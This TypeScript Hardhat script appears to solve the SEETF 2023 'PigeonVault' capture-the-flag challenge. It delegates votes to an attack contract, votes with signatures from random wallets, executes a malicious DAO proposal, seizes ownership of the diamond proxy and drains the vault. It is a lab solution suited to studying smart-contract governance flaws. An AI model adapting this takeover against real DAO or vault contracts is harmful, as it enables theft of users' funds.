import chalk from "chalk";
import { ethers } from "hardhat";
import { SetupPigeonVaultSEETF23__factory, SetupPigeonVaultSEETF23, FeatherCoinFacetSEETF23__factory, DAOFacetSEETF23__factory, DiamondAttackSEETF23__factory, DiamondAttackFacetSEETF23__factory, OwnershipFacetSEETF23__factory, PigeonVaultFacetSEETF23__factory} from "../../typechain";
import { log, initialize } from "../utils";
import { randomBytes } from "crypto";
import { mine } from "@nomicfoundation/hardhat-network-helpers";

async function main() {
    let [setupPigeonVaultSEETF23Contract, attacker] = await initialize<SetupPigeonVaultSEETF23>(SetupPigeonVaultSEETF23__factory, undefined, undefined, "3000");

    let pigeonDiamondAddress = await setupPigeonVaultSEETF23Contract.pigeonDiamond();
    let ftc = FeatherCoinFacetSEETF23__factory.connect(pigeonDiamondAddress, attacker);
    let dao = DAOFacetSEETF23__factory.connect(pigeonDiamondAddress, attacker);
    let tx = await setupPigeonVaultSEETF23Contract.claim();
    await tx.wait();
    log(`Attacker FTC amount: ${chalk.yellow(ethers.formatEther(await ftc.balanceOf(attacker)))}`);

    let attackContract = await new DiamondAttackSEETF23__factory(attacker).deploy(pigeonDiamondAddress);
    await attackContract.waitForDeployment();

    tx = await ftc.delegate(await attackContract.getAddress());  // set checkpoint before proposal
    await tx.wait();

    tx = await attackContract.submit();
    await tx.wait();
    let proposalID = await attackContract.proposalID();
    log(`Submitted proposal ID: ${chalk.yellow(proposalID)}`);
    
    let sigs = [];
    for(let i = 0; i < 11; i++) {
        let privateKey = "0x" + randomBytes(32).toString("hex");
        let signer = new ethers.Wallet(privateKey);
        let sig = await signer.signMessage(ethers.id("\x19Ethereum Signed Message:\n32"));
        sigs.push(sig);
    }
    tx = await attackContract.vote(sigs);
    await tx.wait();

    await mine(5);
    
    tx = await dao.executeProposal(proposalID);
    await tx.wait();
    log(`Successfully execute proposal!`);

    let attackFacet = DiamondAttackFacetSEETF23__factory.connect(pigeonDiamondAddress, attacker);
    tx = await attackFacet.attack(attacker);
    await tx.wait();

    let ownershipFacet = OwnershipFacetSEETF23__factory.connect(pigeonDiamondAddress, attacker);
    log(`New owner: ${chalk.yellow(await ownershipFacet.owner())}`);

    let vault = PigeonVaultFacetSEETF23__factory.connect(pigeonDiamondAddress, attacker);
    tx = await vault.emergencyWithdraw();
    await tx.wait();
    log(`Attacker balance: ${chalk.yellow(await ethers.provider.getBalance(attacker))}`);
    
    log(`Is solved: ${chalk.yellow(await setupPigeonVaultSEETF23Contract.isSolved())}`);
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});